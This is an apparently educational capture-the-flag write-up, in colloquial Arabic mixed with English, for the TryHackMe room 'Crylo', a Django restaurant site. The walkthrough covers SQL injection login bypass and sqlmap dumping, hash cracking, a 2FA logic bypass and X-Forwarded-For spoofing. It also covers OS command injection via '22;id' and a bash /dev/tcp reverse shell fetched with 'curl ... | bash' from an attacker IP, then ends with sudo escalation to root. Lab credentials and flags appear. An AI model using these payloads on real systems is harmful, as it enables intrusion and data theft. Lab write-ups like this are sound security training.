<div dir="rtl" style="text-align: right; width: 100%; word-wrap: break-word; overflow-wrap: break-word; line-height: 2; letter-spacing: 0.2px;">

<p align="center">
  <img src="Crylo-screens/1786574722601_image.png" width="400">
</p>

# Machine Information

- **Machine Name**: Crylo
- **Platform**: TryHackMe
- **Difficulty**: Easy
- **Topics Covered**: Web Enumeration (ffuf), SQL Injection (Authentication Bypass + Automated Exploitation with sqlmap), Hash Cracking (John the Ripper), Client-Side JavaScript Review (CryptoJS/AES) & Logic-based 2FA Bypass, HTTP Header Spoofing (X-Forwarded-For) لتجاوز Access Control، OS Command Injection، Reverse Shell, Source Code Review (Django)، وعمل Custom AES Decryption Script لفك تشفير Credentials، وصولاً لـ Privilege Escalation عن طريق Sudo.

---

# Lab Overview

ماشين Crylo عبارة عن Web Application مبنية بـ Django اسمها "Spicyo" (موقع Demo لمطعم/توصيل أكل)، والفكرة الأساسية بتاعة الماشين إنها بتعلّمنا إزاي الـ Client-Side Encryption (باستخدام مكتبة CryptoJS) ممكن تدي إحساس زائف بالأمان لو الـ Server-Side منطق التحقق فيه Logic Flaw. رحلة الاستغلال كاملة بتاخدنا من SQL Injection كلاسيكي في صفحة الـ Login، مروراً باستخراج الـ Database عن طريق sqlmap، وكسر الـ Hashes، وتحليل كود JavaScript لفهم آلية الـ 2FA PIN وتجاوزها، لحد الوصول لـ Endpoint داخلي (Internal-Only) محمي بفحص IP بسيط قابل للتزوير، وفيه Vulnerability من نوع OS Command Injection بتدينا Reverse Shell. أما الوصول لصلاحيات الـ root فكان عن طريق مراجعة كود المصدر بتاع تطبيق الـ Django نفسه، ولقينا فيه Custom Encryption Scheme استخدمناها عكسياً (Reverse Engineering) عشان نفك تشفير الباسورد الحقيقي بتاع يوزر تاني عنده صلاحيات Sudo.

**ملحوظة**: الماشين اتعمل عليها أكتر من Session، فهيظهر أكتر من IP على طول الـ Write-up (زي `10.130.168.106`، `10.128.173.116`، `10.128.178.115`)، وده طبيعي جداً في TryHackMe لأن كل مرة تشغل فيها الماشين من جديد بتاخد IP جديد داخل شبكة الـ VPN، لكن في كل الحالات إحنا بنكلم نفس الـ Target.

---

# Initial Enumeration

# Phase 1: Network Scanning

## Execution Parameters
```bash
nmap -sV -Pn -sC 10.130.168.106
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/1786574164304_Screenshot_2026-08-12_192037.png" width="600">
</p>

## Technical Analysis

* **Findings**: البورت المفتوحين هما `22/tcp` شغال عليه OpenSSH 8.2p1 على Ubuntu، و`80/tcp` شغال عليه nginx 1.18.0 وظاهر من الـ `http-title` إن اسم الموقع "Spicyo".
* **Impact**: الـ SSH مش هيبقى نقطة دخول مباشرة من غير Credentials، يبقى كل تركيزنا هيكون على الـ Web Application اللي شغالة على بورت 80.
* **Assessment & Conclusions**: النتيجة دي مطابقة تماماً لإجابة Task 1 في الـ Room (`How many ports are open? = 2`)، وهي بداية منطقية جداً لأي Engagement.

## Next Logical Step

عمل Content Discovery على الموقع عشان نكتشف الـ Endpoints والـ Directories المخفية.

---

# Phase 2: Web Content Discovery

## Execution Parameters
```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -ac -c -u http://10.130.168.106/FUZZ
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_192231.png" width="600">
</p>

## Technical Analysis

* **Findings**: ffuf رجعلنا 6 Endpoints: `about`, `blog`, `contact`, `login`, `recipe` كلهم برجوع `200 OK`، وواحد بس مختلف وهو `debug` برجوع كود `403 Forbidden`.
* **Impact**: وجود Endpoint اسمه `/debug` وبيرجع 403 (مش 404) معناه إنه موجود فعلاً على السيرفر لكن فيه Access Control بيمنع الوصول ليه، وده هدف واضح لمحاولات Bypass لاحقاً.
* **Assessment & Conclusions**: النتيجة دي مطابقة لإجابة Task 1 التانية (`What is the 403/forbidden web page? = /debug`).

## Next Logical Step

فتح الموقع يدوياً في المتصفح لمعاينة الشكل العام، وبعدين معاينة شكل صفحة الـ `/debug` نفسها.

---

# Phase 3: Manual Application Walkthrough

## Execution Parameters
*(Manual browsing via Firefox لمعاينة شكل التطبيق والصفحات المتاحة)*

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_192333.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_192405.png" width="300">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_192452.png" width="600">
</p>

## Technical Analysis

* **Findings**: الصفحة الرئيسية عبارة عن موقع مطعم/توصيل أكل (Spicyo) فيه Navigation Menu بسيط (Home, About, Recipe, Blog, Contact Us) وزرار `Login` في الأعلى. لما فتحنا `/debug` مباشرة، طلعت صفحة `Forbidden` بسيطة (Custom 403 Page فيها صورة كوميدية) من غير أي محتوى حقيقي.
* **Impact**: الصفحة دي في الوضع الحالي (قبل أي Login) عبارة عن Static Forbidden Page بس، يعني الـ Restriction هنا مش مرتبط بـ IP بس، ممكن يبقى مرتبط كمان بحالة الـ Session (Logged in ولا لأ).
* **Assessment & Conclusions**: زرار الـ Login هو أوضح نقطة دخول للتطبيق، فهنبدأ نختبر فورم الـ Login مباشرة.

## Next Logical Step

اختبار حقول اليوزرنيم والباسورد في صفحة الـ Login بمحاولة Bypass كلاسيكي للـ Authentication عن طريق SQL Injection.

---

# Vulnerability Analysis & Exploitation

# Phase 4: SQL Injection — Authentication Bypass on /login

## Execution Parameters
```
Baseline Test  : username=admin , password=admin
Error Test     : username=admin' , password=admin
Bypass Payload : username=admin' -- - , password=(anything)
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_192848.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_192906.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_192933.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_193001.png" width="600">
</p>

## Technical Analysis

* **Findings**: اعترضنا الـ Request بتاع الـ Login باستخدام Burp Suite (Proxy + Repeater). لما بعتنا Credentials عادية رجع `200 OK`، لكن لما ضفنا Single Quote في اليوزرنيم (`admin'`)، السيرفر رجع `500 Internal Server Error`، وده مؤشر كلاسيكي إن الـ Query اتكسرت وإن الـ Parameter دخل مباشرة في جملة SQL من غير أي Sanitization. بعد كدا جربنا نقفل الـ Query بتعليق باقي الشرط (`admin' -- -`) ورجع `200 OK` تاني، يعني تم تجاوز التحقق من الباسورد بالكامل.
* **Impact**: ده مثال كلاسيكي على (Authentication Bypass via SQL Injection)، الاستعلام على الأغلب شكله شبيه بـ `SELECT * FROM auth_user WHERE username = '$username' AND password = '$password'`، وبإضافة `-- -` بعد اليوزرنيم بنعلّق باقي جملة الـ WHERE فيتجاوز التحقق من الباسورد تماماً.
* **Assessment & Conclusions**: أهم حاجة هنا مش إننا دخلنا كـ admin بس، إنما إننا أثبتنا إن الـ Parameter دي (`username`) Injectable، وده بيفتح الباب لاستخدام سقلماب في استخراج الداتا كلها بشكل آلي.

## Pentester Rationale

اختبار Payload بسيط زي `'` في الأول هو الخطوة الأولى دايماً قبل أي حاجة تانية، لأنه بيدي نتيجة سريعة (500 Error) بتأكد وجود الثغرة من غير ما نحتاج نستخدم أي أداة آلية.

## Alternative Attack Vectors

* `' or 1=1 -- -`
* `admin'#` (لو الداتابيز MySQL وبتقبل الـ `#` كـ Comment)

## Next Logical Step

بما إن الـ `username` Parameter مؤكد إنه Injectable، الخطوة الجاية حفظ الـ Request في ملف (`login.req`) واستخدام sqlmap لأتمتة عملية استخراج قاعدة البيانات.

---

# Phase 5: Automated Exploitation with sqlmap — DB & Table Enumeration

## Execution Parameters
```bash
sqlmap -r login.req --dbs --batch
sqlmap -r login.req --technique T --threads 5 -D food --tables --batch
sqlmap -r login.req --technique T --level=3 --risk=3 -D food -T auth_user --columns --batch --time-sec=2
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_194435.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_194448.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_201005.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_213229.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_213242.png" width="600">
</p>

## Technical Analysis

* **Findings**: سقلماب أكد إن الثغرة من نوع (Time-based Blind SQL Injection) على الـ `MULTIPART username` Parameter، وحدد إن الـ Back-end DBMS هو MySQL. استخرجنا أسماء الـ Databases (`food`, `information_schema`, `mysql`, `performance_schema`, `sys`)، وبعدين ركزنا على قاعدة بيانات `food` واستخرجنا الجداول (13 جدول) من ضمنهم `auth_user`, `accounts_pin`, `accounts_pintoken`, `accounts_upload`, `django_session`. وأخيراً استخرجنا أعمدة جدول `auth_user` (11 عمود: `id`, `username`, `password`, `email`, `first_name`, `last_name`, `is_staff`, `is_superuser`, `is_active`, `last_login`, `date_joined`).
* **Impact**: أسماء الجداول لوحدها بتدينا معلومات قيّمة قبل حتى ما نشوف أي بيانات — وجود `accounts_pin` و`accounts_pintoken` بيأكد إن التطبيق فعلاً فيه نظام 2FA بـ PIN، ووجود `accounts_upload` بيقول إن فيه ملفات أو بيانات متخزنة بشكل تاني (هنرجعلها لاحقاً).
* **Assessment & Conclusions**: بما إن `auth_user` هو الجدول اللي فيه بيانات تسجيل الدخول، الخطوة الجاية هي عمل Dump على عمودي `username` و`password` منه.

## Pentester Rationale

استخدام `--technique T` (Time-based) بشكل صريح كان ضروري هنا لأن الثغرة Blind، يعني السيرفر مش بيرجعلنا أي Error أو رسالة توضح نتيجة الاستعلام، والطريقة الوحيدة إننا نتأكد صح الاستعلام ولا لأ هي قياس زمن الاستجابة.

## Next Logical Step

عمل Dump كامل على أعمدة `username` و`password` في جدول `auth_user`.

---

# Phase 6: Dumping Credentials from auth_user

## Execution Parameters
```bash
sqlmap -r login.req --technique T -D food -T auth_user -C username,password --dump --batch --time-sec=1 --flush-session
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_215440.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_215950.png" width="600">
</p>

## Technical Analysis

* **Findings**: ظهر صفين بس في الجدول: يوزر `admin` بباسورد على شكل Hash قياسي بتاع Django (`pbkdf2_sha256$260000$...`)، ويوزر `anof` لكن قيمة الـ "password" بتاعه كانت شكلها غريب ومختلفة تماماً عن شكل الـ Django Hash العادي (`VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1V0=`) — شكل الـ String ده Base64، مش Hash.
* **Impact**: ده اكتشاف مهم جداً هنستفاد منه بعدين. يوزر `admin` معاه Hash قياسي ممكن نحاول نكسره بـ Wordlist عادي، لكن يوزر `anof` قيمته دي مش Hash بالمرة، دي غالباً بيانات مُشفّرة (Encrypted) بطريقة التطبيق الخاصة، يعني كسرها بـ Dictionary Attack مستحيل من غير ما نعرف الـ Encryption Key المستخدمة.
* **Assessment & Conclusions**: هنركز الأول على كسر Hash الـ admin عشان نقدر ندخل التطبيق، وهنسيب قيمة `anof` المشفرة دي في بالنا — هترجعلنا في مرحلة الـ Privilege Escalation لما نلاقي المفتاح المناسب.

## Next Logical Step

محاولة كسر الـ Hash بتاع admin.

---

# Phase 7: Cracking the admin Hash

## Execution Parameters
```bash
echo 'admin:$django$*1*pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=' > admin_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_221815.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_223057.png" width="600">
</p>

## Technical Analysis

* **Findings**: أول محاولة كانت باستخدام الـ Cracking المدمج جوه sqlmap نفسه (بيستخدم Dictionary بسيط)، لكنه فشل ورجع "no clear password(s) found". فرفعنا الـ Hash يدوياً بصيغة Django المعروفة لأداة John the Ripper، وشغّلناه بـ `rockyou.txt`، وفعلاً اتكسر الباسورد بسرعة: `trigger`.
* **Impact**: هنا بقى معانا Credentials كاملة للـ admin (`admin:trigger`)، وده مطابق تماماً لإجابة Task 2 (`username: admin`, `password: trigger`).
* **Assessment & Conclusions**: نقدر دلوقتي نسجل دخول رسمي في التطبيق بدل الاعتماد على SQLi Bypass بس، عشان نشوف باقي الصفحات اللي محتاجة Session حقيقي.

## Next Logical Step

تسجيل الدخول بالـ Credentials المكسورة، ومعاينة اللي بيحصل بعد الـ Login.

---

# Phase 8: Encountering the 2FA PIN Mechanism

## Execution Parameters
```
Login: admin / trigger
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_223341.png" width="600">
</p>

## Technical Analysis

* **Findings**: بعد تسجيل الدخول بالـ Credentials الصح، التطبيق مبيدخلش على طول، إنما بيوجّهنا لصفحة "Enter Your Pin" وبيطلب رقم PIN من 4 أرقام (2FA إضافي فوق اليوزرنيم والباسورد).
* **Impact**: وده بيفسّر ليه كان فيه جداول `accounts_pin` و`accounts_pintoken` في قاعدة البيانات. المشكلة إن إحنا معندناش أي فكرة عن الـ PIN بتاع الـ admin.
* **Assessment & Conclusions**: بدل ما نحاول نخمّن الـ PIN، الأدق إننا نراجع كود الـ JavaScript بتاع الصفحة عشان نفهم الآلية اللي بيتم بيها التحقق من الـ PIN من الأساس.

## Next Logical Step

فتح الـ Developer Tools ومراجعة كود الـ JavaScript المسؤول عن الـ 2FA.

---

# Phase 9: Client-Side Code Review & 2FA Logic Bypass

## Execution Parameters
*(مراجعة يدوية لكود الـ JavaScript الظاهر في الصفحة عن طريق Developer Tools)*

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_223728.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_223849.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_223959.png" width="400">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_225403.png" width="600">
</p>

## Technical Analysis

* **Findings**: الكود بيستخدم مكتبة **CryptoJS** لعمل AES Decrypt للـ Response اللي راجع من السيرفر بعد الـ Login، وبعد فك التشفير بيقرأ قيمة `jsonResponse.pin_set`: لو `"true"` بيوديك لصفحة إدخال الـ PIN الموجود (`enterpinid`)، ولو `"false"` بيوديك لصفحة عمل PIN جديد من الأول (`createpinid` / `/set-pin`). الـ Logic بالكامل عامل على أساس افتراض إن اليوزر ماعندوش PIN متسجل من قبل، لكن ده Client-Side بس ومفيش أي تحقق حقيقي من السيرفر بيمنعنا من الوصول لصفحة `/set-pin` مباشرة حتى لو أصلاً عند الـ admin PIN متسجل بالفعل.
* **Impact**: بما إن الـ Routing بين الصفحتين بيتحدد بمنطق في الـ Front-End بس، نقدر ببساطة نتجاوز الخطوة كلها عن طريق التنقل يدوياً لـ `/set-pin` وتسجيل PIN جديد من عندنا (Insecure Direct Object / Broken Access Control على مستوى الـ Flow).
* **Assessment & Conclusions**: بتنفيذ الخطوة دي، سجّلنا PIN جديد (`1234`) وقدرنا ندخل الـ Dashboard بنجاح كـ `admin` (ظهرت "Hello, admin" في الهيدر)، وده مطابق تماماً لإجابات Task 3 (`CryptoJS`, `pin_set`, `AES`).

## Pentester Rationale

مراجعة كود الـ JavaScript الظاهر للمستخدم (View Source / Dev Tools) هي خطوة أساسية في أي Web App Pentest، لأن أي منطق حساس بيتنفذ أو بيتقرر في المتصفح ممكن يتلعب فيه أو يتجاوز بسهولة، والاعتماد عليه للـ Access Control غلط شائع جداً.

## Alternative Attack Vectors

* محاولة التلاعب مباشرة في قيمة `pin_set` جوه الـ Response عن طريق Burp (Response Tampering) بدل التنقل اليدوي للصفحة.

## Next Logical Step

بعد الدخول كـ admin بنجاح، الرجوع لصفحة `/debug` (اللي كانت 403 من الأول) ومعاينة هل الاستجابة اتغيرت دلوقتي وإحنا Logged in.

---

# Phase 10: Bypassing the Internal-Only /debug Panel

## Execution Parameters
```
GET /debug HTTP/1.1
Header Added: X-Forwarded-For: 127.0.0.1
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_231938.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_230130.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_232737.png" width="600">
</p>

## Technical Analysis

* **Findings**: بعد تسجيل الدخول كـ admin، فتحنا `/debug` تاني ولقينا رسالة أوضح من الأول: `"The page is for Local Users Only"`، يعني الصفحة دلوقتي بتفرّق على أساس إن الطلب جاي من جهاز محلي (Local) ولا لأ. اعترضنا الـ Request بـ Burp Suite Proxy وضفنا Header اسمه `X-Forwarded-For` بقيمة `127.0.0.1`، وده الـ Header اللي كتير من التطبيقات بتستخدمه (غلط) عشان تعرف الـ "Real IP" بتاع الزائر لو التطبيق شغال ورا Reverse Proxy. الـ Server صدّق الـ Header ده من غير أي تحقق حقيقي، وسمح بالدخول.
* **Impact**: ده مثال كلاسيكي على (IP-based Access Control Bypass via Header Spoofing)، لأن الـ `X-Forwarded-For` Header بييجي من الـ Client نفسه، وأي حد يقدر يزوّره ويكتب فيه أي قيمة يحبها.
* **Assessment & Conclusions**: بعد إضافة الـ Header بنجاح، ظهرت صفحة جديدة كاملة اسمها "For Internal Usage" فيها أداة داخلية لفحص البورتات المفتوحة (Check for open services)، وده مطابق لإجابات Task 4 (`X-Forwarded-For`, `127.0.0.1`).

## Pentester Rationale

لما نلاقي صفحة بترفض الوصول بناءً على "location" أو "local access only"، أول حاجة نجربها هي الـ Headers المعروفة اللي بتتلخبط فيها التطبيقات: `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, `X-Client-IP`.

## Alternative Attack Vectors

* `X-Real-IP: 127.0.0.1`
* `X-Client-IP: 127.0.0.1`
* استخدام إضافة زي Burp's Match & Replace عشان تضيف الـ Header تلقائي على كل Request بدل ما تعدّل يدوي كل مرة.

## Next Logical Step

معاينة الأداة الداخلية اللي ظهرت ("Check for open services") واختبار حقل الإدخال بتاعها لثغرات محتملة.

---

# Phase 11: OS Command Injection in the Internal Port-Check Tool

## Execution Parameters
```
Input Field: 22;id
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_232847.png" width="600">
</p>

## Technical Analysis

* **Findings**: الأداة الداخلية عبارة عن حقل بياخد رقم بورت (القيمة الافتراضية `22`) وبيرجع وصف الخدمة المرتبطة بيه من ملف `/etc/services`. لما جربنا ندخل `22;id` بدل ما نبعت رقم بس، السيرفر نفّذ الأمر `id` فعلياً ورجّع النتيجة (`uid=1001(crylo) gid=33(www-data) groups=33(www-data)`) جنب نتيجة البحث عن البورت العادية.
* **Impact**: ده تأكيد كامل إن الـ Input بتاع الحقل ده بيتحط مباشرة جوه Shell Command على السيرفر (على الأغلب حاجة شبيهة بـ `grep -w $port /etc/services` بتتنفذ عن طريق `os.system()` أو `subprocess` بـ `shell=True` في كود الـ Python)، والفاصلة المنقوطة (`;`) بتخلينا ندمج أمر تاني معاه وينفذه الـ Shell عادي.
* **Assessment & Conclusions**: النتيجة دي مطابقة لإجابة Task 5 الأولى (`What is the name of the vulnerability used to gain system access? = OS command injection`)، والخطوة الطبيعية الجاية إننا نحوّل الثغرة دي لـ Shell كامل بدل ما نفضل نبعت أوامر واحد واحد.

## Pentester Rationale

اختبار الـ Command Injection بيبدأ دايماً بـ Payload بسيط وآمن زي `id`, `whoami`, أو `sleep 5` عشان نتأكد من التنفيذ من غير ما نأثر على استقرار السيرفر، قبل ما نستخدم Payload أعقد زي Reverse Shell.

## Alternative Attack Vectors

* `22|id` أو `22 && id` أو `` 22`id` `` حسب نوع الـ Shell اللي بيستخدمه الكود من ورا.
* استخدام `22;sleep 5` لتأكيد الثغرة بطريقة Blind (زمن الاستجابة) لو مفيش Output ظاهر.

## Next Logical Step

استغلال الثغرة للحصول على Reverse Shell كامل التفاعل بدل تنفيذ أوامر منفصلة.

---

# Phase 12: Weaponizing the Injection — Reverse Shell

## Execution Parameters
```bash
# على جهاز المهاجم (Attacker)
nc -nvlp 9001

# ملف thmrev.sh اللي هيتم استضافته
#!/bin/bash
bash -i >& /dev/tcp/192.168.157.166/9001 0>&1

# استضافة الملف
python3 -m http.server 80

# الـ Payload اللي اتبعت في حقل البورت
22;curl http://192.168.157.166/thmrev.sh|bash
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_234010.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_234135.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_234305.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_234315.png" width="600">
</p>

## Technical Analysis

* **Findings**: جهّزنا سكريبت بسيط (`thmrev.sh`) بيعمل Bash Reverse Shell لـ IP وبورت جهازنا، استضفناه على HTTP Server محلي بسيط (`python3 -m http.server`)، وفتحنا Listener بـ `netcat` على البورت 9001. بعدين استخدمنا نفس ثغرة الـ Command Injection في حقل البورت لتحميل الملف وتنفيذه فوراً (`curl ... | bash`) من غير ما نسيب أي أثر ملفات على السيرفر. اللوج بتاع الـ HTTP Server أكد إن السيرفر طلب الملف فعلاً، ولحظات بعدها استقبلنا Connection على الـ Listener.
* **Impact**: وصلنا لـ Interactive Shell (لسه Non-TTY) على السيرفر باليوزر `crylo`، وده أول Foothold حقيقي على الماشين.
* **Assessment & Conclusions**: الـ Shell في الوضع ده محدود جداً (مفيش Job Control، مفيش Terminal Process Group)، فالخطوة الجاية هي عمل Upgrade ليه لـ Shell مستقر بالكامل.

## Pentester Rationale

استضافة الـ Payload على HTTP Server محلي بدل كتابته كامل جوه الـ Injection نفسه بيتفادى مشاكل الـ Special Characters والـ URL Encoding، وبيخلي الـ Payload المرسل قصير وسهل التحكم فيه.

## Next Logical Step

عمل Shell Stabilization (ترقية الـ Shell لـ Full TTY) والبدء في استكشاف نظام الملفات.

---

# Phase 13: Shell Stabilization & User Flag

## Execution Parameters
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# على جهاز المهاجم بعد Ctrl+Z
stty raw -echo; fg
stty rows 35 cols 104
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_234926.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_235421.png" width="600">
</p>

## Technical Analysis

* **Findings**: بعد تنفيذ `id` تأكدنا إننا `uid=1001(crylo) gid=33(www-data)`. رفعنا الـ Shell لـ PTY كامل عن طريق `python3 -c 'import pty;pty.spawn("/bin/bash")'` (أول محاولة بمود typo وهي `pty.spam` فشلت بـ `AttributeError`، وبعدين صححناها لـ `pty.spawn`)، وبعد كدا ظبطنا الـ Terminal بالكامل (`export TERM=xterm` + `stty raw -echo; fg` + مطابقة الـ rows/cols) عشان نقدر نستخدم أدوات زي `nano` أو `vim` أو نعمل Ctrl+C عادي من غير ما الـ Shell يقفل.
* **Impact**: دخلنا على مجلد الهوم بتاع `crylo` ولقينا فيه ملف `user.txt`.
* **Assessment & Conclusions**: قرينا محتوى الملف وحصلنا على **User Flag**: `fa3e352b00adf9d4e967ad0e34d5e59d`، ومطابق تماماً لإجابة Task 5 (`What is the user flag?`).

## Next Logical Step

البحث عن طرق للـ Privilege Escalation، بدايةً بمعرفة مين الأعضاء في مجموعة الـ sudo.

---

# Phase 14: Privilege Escalation — Source Code Review

## Execution Parameters
```bash
cat /etc/group | grep sudo
cd Food/food
cat settings.py
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_235932.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-12_235946.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_000237.png" width="600">
</p>

## Technical Analysis

* **Findings**: `cat /etc/group | grep sudo` أظهر إن اليوزر **`anof`** (وكمان `ubuntu`) عضو في مجموعة الـ sudo، ومطابق لإجابة Task 5 (`Which user is part of the sudo group? = anof`). بعد كدا دخلنا على مجلد مشروع الـ Django نفسه (`Food/food`)، ولقينا ملف `settings.py` فيه معلومات حساسة جداً: الـ `SECRET_KEY` بتاع Django، والأهم من كدا كونفيج الـ Database بالكامل (`DATABASES`) وفيه Credentials صريحة: `USER: 'anof'` و`PASSWORD: 'MySpass@1'`.
* **Impact**: أي ملف Settings بيحتوي على Credentials صريحة (Hardcoded Credentials) هو دايماً هدف أساسي في أي Post-Exploitation، خصوصاً في تطبيقات الـ Django/Flask اللي غالباً بتتوقع الـ Environment Variables تتخزن في مكان تاني وليس مباشرة في الكود.
* **Assessment & Conclusions**: عندنا الآن اسم اليوزر صاحب الصلاحيات (`anof`) وباسورد محتمل (`MySpass@1`) نجرب نستخدمه للانتقال لليوزر ده.

## Next Logical Step

تجربة الباسورد المكتشف مع أمر `su - anof`.

---

# Phase 15: The Rabbit Hole — Database Credentials Don't Match

## Execution Parameters
```bash
su - anof
# Password: MySpass@1
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_000237.png" width="600">
</p>

## Technical Analysis

* **Findings**: الباسورد `MySpass@1` (بتاع الـ MySQL Database) رجع `su: Authentication failure` — يعني الباسورد ده خاص بحساب الـ Database بس، مش نفس باسورد حساب النظام (System Account) بتاع اليوزر `anof`.
* **Impact**: ده مثال واقعي جداً على (False Lead / Rabbit Hole) في أي Engagement — لقاء Credentials في مكان معين مبيضمنش إنها هتشتغل في كل مكان تاني، ولازم نفرّق دايماً بين Database Credentials وSystem Credentials.
* **Assessment & Conclusions**: لازم نكمل البحث جوه كود المصدر نفسه عن أي أثر تاني للباسورد الحقيقي بتاع `anof`.

## Next Logical Step

عمل بحث نصي شامل (`grep`) جوه ملفات المشروع كله عن أي كلمة أو Pattern علاقته بالباسورد.

---

# Phase 16: Reverse Engineering the Custom AES Encryption

## Execution Parameters
```bash
grep -i pass * -r
cat accounts/enc.py
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_000757.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_002911.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_002858.png" width="600">
</p>
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_010354.png" width="600">
</p>

## Technical Analysis

* **Findings**: البحث في تطبيق `accounts` كشف ملف `enc.py`، وهو الملف المسؤول عن عمليات التشفير وفك التشفير جوه التطبيق (نفس الفكرة بتاعة CryptoJS اللي شفناها في الفرونت إند بالظبط بس على السيرفر). جوه الملف ده لقينا متغير مفتاح تشفير (Encryption Key)، ودالة بتعمل AES Encrypt/Decrypt بنفس الطريقة (AES/CBC مع Key وIV ثابتين). ورجعنا بالذاكرة لقيمة عمود الـ "password" بتاع `anof` اللي طلعت معانا من قاعدة البيانات في Phase 6 (`VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1V0=`) — وهي فعلاً Base64 مطابقة لشكل الداتا اللي بيشفرها/بيفك تشفيرها الملف ده بالظبط. يعني الباسورد الحقيقي بتاع `anof` مش متخزن Plaintext ولا حتى بـ Hash عادي، إنما متخزن مُشفّر بمفتاح التطبيق الخاص (Custom Application-Level Encryption).
* **Impact**: كتبنا سكريبت Python بسيط (باستخدام مكتبة `pycryptodome`) بياخد نفس الـ Key وIV اللي لقيناهم في `enc.py`، وبيعمل AES Decrypt للـ Base64 String اللي طلعنا بيه من الداتابيز، وطلع لنا الباسورد الحقيقي بشكل واضح: **`@Pass123@666666666`**.
* **Assessment & Conclusions**: ده أهم اكتشاف في مرحلة الـ Privilege Escalation — ربطنا بين Finding قديم من مرحلة الـ SQL Injection (قيمة عمود الـ password المشفرة) وبين Finding جديد من مراجعة كود المصدر (مفتاح التشفير)، وده مطابق لإجابة Task 5 (`What is the password for the above user? = @Pass123@666666666`).

## Pentester Rationale

أي قيمة غريبة الشكل بترجع من قاعدة البيانات ومش شكلها Hash قياسي (زي `pbkdf2_sha256` أو `bcrypt`) لازم تتحط في الاعتبار كـ "بيانات مُشفّرة" مش "بيانات مُجزّأة"، والفرق مهم جداً: الـ Hash معملوش Decrypt، لكن الـ Encryption ليه Key ونقدر نرجّعها لأصلها لو لقينا المفتاح.

## Alternative Attack Vectors

* لو مكناش لاقيين الـ Key جوه كود المصدر مباشرة، كنا نقدر نجرب Brute-force على الـ Key نفسه لو كان قصير، أو نستخدم الـ CryptoJS Logic اللي في الفرونت إند (زي ما شفنا في الـ 2FA) كدليل على نفس Pattern التشفير.

## Next Logical Step

استخدام الباسورد المفكوك عشان نعمل `su` بنجاح لليوزر `anof` ونشوف صلاحياته.

---

# Phase 17: Privilege Escalation to root

## Execution Parameters
```bash
su - anof
# Password: @Pass123@666666666
sudo -l
sudo bash
cat /root/flag.txt
```

## Evidence & Outputs
<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_010354.png" width="600">
</p>

## Technical Analysis

* **Findings**: الباسورد المفكوك اشتغل، وعملنا `su - anof` بنجاح. شغّلنا `sudo -l` ولقينا إن `anof` معاه صلاحية `(ALL : ALL) ALL`، يعني يقدر ينفذ أي أمر بصلاحيات root من غير أي قيود.
* **Impact**: نفذنا `sudo bash` وطلعت لينا Shell بصلاحيات `uid=0(root)` على طول.
